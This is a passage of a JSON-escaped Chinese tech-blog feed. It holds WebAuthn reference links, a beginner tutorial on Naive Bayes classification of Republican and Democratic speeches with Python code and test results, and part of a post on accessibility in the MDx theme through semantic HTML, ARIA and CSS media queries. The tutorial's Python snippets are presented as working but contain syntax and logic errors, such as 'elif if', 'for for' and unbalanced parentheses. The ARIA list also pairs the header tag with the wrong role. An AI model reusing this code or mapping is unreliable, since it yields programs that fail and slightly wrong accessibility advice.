href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 